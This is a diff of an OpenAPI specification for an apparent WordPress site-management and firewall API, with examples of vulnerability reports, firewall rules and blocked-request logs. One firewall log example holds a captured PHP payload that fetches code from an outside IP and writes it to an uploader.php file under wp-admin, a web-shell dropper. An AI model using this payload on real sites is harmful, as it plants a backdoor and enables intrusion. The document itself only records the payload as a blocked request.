@@ -591,7 +591,7 @@ paths:
                 siteInfo:
                   '1': 'https://test.com'
                 software:
-                  - { site: 1, canUpdate: false, issue: { id: 41369324, sw_type: php, sw_name: PHP, sw_cur_ver: 7.4.3, sw_new_ver: '', sw_active: null, isVulnerable: false, isOutdated: null, fixed_in: null, affected_in: null, sw_key: null, sw_key_title: null, is_exploited: null, patch_priority: null, credit_name: null } }
+                  - { site: 1, canUpdate: false, issue: { id: 41369324, sw_type: php, sw_name: PHP, sw_cur_ver: 7.4.3, sw_new_ver: '', sw_active: null, isVulnerable: false, isOutdated: null, fixed_in: 'null', affected_in: 'null', sw_key: null, sw_key_title: null, is_exploited: null, patch_priority: null, credit_name: null } }
                   - { site: 1, canUpdate: false, issue: { id: 41369266, sw_type: plugin, sw_name: 'Anderson Pro', sw_cur_ver: 1.2.1, sw_new_ver: 1.2.2, sw_active: 1, isVulnerable: 1, isOutdated: 1, fixed_in: 1.2.2, affected_in: '< 1.2.1', sw_key: anderson/anderson.php, sw_key_title: anderson, is_exploited: 0, patch_priority: 3, credit_name: 'Researcher name' } }
                 total: 2
   /component/autoupdates:
@@ -1074,11 +1074,11 @@ paths:
                 function:
                   description: 'The JSON of the rule to test.'
                   type: string
-                  default: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]'
+                  default: '[{"parameter":"server.HTTP_USER_AGENT","match":{"type":"contains","value":"ABadBot"}}]'
                 request_json:
                   description: 'The JSON of the request to test against.'
                   type: string
-                  default: '{\"SERVER\":{\"HTTP_USER_AGENT\":\"FireFox123 ABadBot Edge\"},\"GET\":{\"id\":123},\"POST\":{\"id\":123}}'
+                  default: '{"SERVER":{"HTTP_USER_AGENT":"FireFox123 ABadBot Edge"},"GET":{"id":123},"POST":{"id":123}}'
               type: object
       responses:
         '200':
@@ -1133,11 +1133,11 @@ paths:
                 rule_v2:
                   description: 'The JSON rule format.'
                   type: string
-                  default: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]'
+                  default: '[{"parameter":"server.HTTP_USER_AGENT","match":{"type":"contains","value":"ABadBot"}}]'
                 rule_request:
                   description: 'The JSON request format to test.'
                   type: string
-                  default: '{\"SERVER\":{\"HTTP_USER_AGENT\":\"FireFox123 ABadBot Edge\"},\"GET\":{\"id\":123},\"POST\":{\"id\":123}}'
+                  default: '{"SERVER":{"HTTP_USER_AGENT":"FireFox123 ABadBot Edge"},"GET":{"id":123},"POST":{"id":123}}'
               type: object
       responses:
         '200':
@@ -1254,15 +1254,15 @@ paths:
               schema:
                 type: array
                 items:
-                  properties: { id: { description: 'Template name.', type: integer, example: 1 }, title: { description: 'Template title.', type: string, example: 'Whitelist IP addresses' }, fields: { description: Fields, type: array, items: { properties: { eval: { description: 'Eval string to execute.', type: string, example: 'JSON.stringify(value.split(\";\"))' }, title: { description: 'Title of field.', type: string, example: 'Enter IP addresses seperated by ;' }, placeholder: { description: 'Placeholder of field.', type: string, example: 'E.g. 192.168.1.1;33.44.55.66' } }, type: object } }, closure: { description: 'Closure to execute.', type: string, example: '' }, rule: { description: 'Rule of the template.', type: string, example: '[\n   {\n      \"parameter\":\"server.ip\",\n      \"match\":{\n         \"type\":\"in_array\",\n         \"value\":<field1>\n      }\n   }\n]' }, type: { description: 'The type of rule to create.', type: string, example: WHITELIST } }
+                  properties: { id: { description: 'Template name.', type: integer, example: 1 }, title: { description: 'Template title.', type: string, example: 'Whitelist IP addresses' }, fields: { description: Fields, type: array, items: { properties: { eval: { description: 'Eval string to execute.', type: string, example: 'JSON.stringify(value.split(";"))' }, title: { description: 'Title of field.', type: string, example: 'Enter IP addresses seperated by ;' }, placeholder: { description: 'Placeholder of field.', type: string, example: 'E.g. 192.168.1.1;33.44.55.66' } }, type: object } }, closure: { description: 'Closure to execute.', type: string, example: '' }, rule: { description: 'Rule of the template.', type: string, example: '[\n   {\n      "parameter":"server.ip",\n      "match":{\n         "type":"in_array",\n         "value":<field1>\n      }\n   }\n]' }, type: { description: 'The type of rule to create.', type: string, example: WHITELIST } }
                   type: object
               example:
                 -
                   id: 1
                   title: 'Whitelist IP addresses'
-                  fields: { eval: 'JSON.stringify(value.split(\";\"))', title: 'Enter IP addresses seperated by ;', placeholder: 'E.g. 192.168.1.1;33.44.55.66' }
+                  fields: { eval: 'JSON.stringify(value.split(";"))', title: 'Enter IP addresses seperated by ;', placeholder: 'E.g. 192.168.1.1;33.44.55.66' }
                   closure: ''
-                  rule: '[\n   {\n      \"parameter\":\"server.ip\",\n      \"match\":{\n         \"type\":\"in_array\",\n         \"value\":<field1>\n      }\n   }\n]'
+                  rule: '[\n   {\n      "parameter":"server.ip",\n      "match":{\n         "type":"in_array",\n         "value":<field1>\n      }\n   }\n]'
                   type: WHITELIST
   '/firewall/rule/{id}':
     get:
@@ -1274,6 +1274,7 @@ paths:
       parameters:
         -
           name: id
+          in: 'null'
           description: 'Unique identifier of the rule.'
           required: true
           example: 71
@@ -1285,12 +1286,12 @@ paths:
               schema:
                 type: array
                 items:
-                  properties: { id: { description: 'Unique identifier of the firewall rule.', type: integer, example: 71 }, title: { description: 'Title of the firewall rule.', type: string, example: 'My very own firewall rule.' }, type: { description: 'Type of action to perform upon a match.', type: string, enum: [BLOCK, REDIRECT, LOG, WHITELIST], example: BLOCK }, type_params: { description: 'If type property equals REDIRECT, specify redirect URL in this field.', type: string, example: '' }, is_whitelist: { description: 'Whether or not this rule is a whitelist rule and not a firewall rule.', type: integer, example: 0 }, method: { description: 'HTTP request method to match against.', type: string, enum: [ALL, GET, POST], example: ALL }, rule_v2: { description: 'The JSON rule format.', type: string, example: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]' }, user_id: { description: 'ID of the user that owns this rule.', type: integer, example: null }, auto_assign: { description: 'Whether or not to auto assign this rule to sites.', type: integer, example: 0 } }
+                  properties: { id: { description: 'Unique identifier of the firewall rule.', type: integer, example: 71 }, title: { description: 'Title of the firewall rule.', type: string, example: 'My very own firewall rule.' }, type: { description: 'Type of action to perform upon a match.', type: string, enum: [BLOCK, REDIRECT, LOG, WHITELIST], example: BLOCK }, type_params: { description: 'If type property equals REDIRECT, specify redirect URL in this field.', type: string, example: '' }, is_whitelist: { description: 'Whether or not this rule is a whitelist rule and not a firewall rule.', type: integer, example: 0 }, method: { description: 'HTTP request method to match against.', type: string, enum: [ALL, GET, POST], example: ALL }, rule_v2: { description: 'The JSON rule format.', type: string, example: '[{"parameter":"server.HTTP_USER_AGENT","match":{"type":"contains","value":"ABadBot"}}]' }, user_id: { description: 'ID of the user that owns this rule.', type: integer, example: null }, auto_assign: { description: 'Whether or not to auto assign this rule to sites.', type: integer, example: 0 } }
                   type: object
               example:
                 id: 71
                 title: 'My very own firewall rule.'
-                rule_v2: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]'
+                rule_v2: '[{"parameter":"server.HTTP_USER_AGENT","match":{"type":"contains","value":"ABadBot"}}]'
                 type: BLOCK
                 type_params: null
                 is_whitelist: 0
@@ -2468,6 +2469,7 @@ paths:
       parameters:
         -
           name: site
+          in: 'null'
           description: 'The unique identifier of the site'
           required: true
           example: 1
@@ -2638,6 +2640,7 @@ paths:
       parameters:
         -
           name: site
+          in: 'null'
           description: 'The unique identifier of the site'
           required: true
           example: 1
@@ -2745,6 +2748,7 @@ paths:
       parameters:
         -
           name: schedule
+          in: 'null'
           description: 'Schedule id.'
           required: true
           example: 1
@@ -2824,6 +2828,7 @@ paths:
       parameters:
         -
           name: schedule
+          in: 'null'
           description: 'Schedule id.'
           required: true
           example: 1
@@ -2858,6 +2863,7 @@ paths:
       parameters:
         -
           name: schedule
+          in: 'null'
           description: 'Schedule id.'
           required: true
           example: 1
@@ -2947,6 +2953,7 @@ paths:
       parameters:
         -
           name: groups
+          in: 'null'
           description: Groups.
           required: true
           example: '1'
@@ -3731,7 +3738,7 @@ paths:
                 user_agent: 'Mozlila\/5.0 (Linux; Android 7.0; SM-G892A Bulid\/NRD90M; wv) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/60.0.3112.107 Moblie Safari\/537.36'
                 method: POST
                 log_date: 'January 9th, 2024 · 13:39:27'
-                post_data: '{\n    \"vz\": \"$x=fwrite(fopen($_SERVER[\''DOCUMENT_ROOT\''].\''\/wp-admin\/css\/colors\/blue\/uploader.php\'',\''w+\''),file_get_contents(\''http:\/\/51.79.124.111\/vz.txt\''));echo \\\\"aDriv4\\\\".$x;\"\n}'
+                post_data: '{\n    "vz": "$x=fwrite(fopen($_SERVER[\''DOCUMENT_ROOT\''].\''\/wp-admin\/css\/colors\/blue\/uploader.php\'',\''w+\''),file_get_contents(\''http:\/\/51.79.124.111\/vz.txt\''));echo \\\"aDriv4\\\".$x;"\n}'
                 action: Block
                 description: Unknown
                 cc:
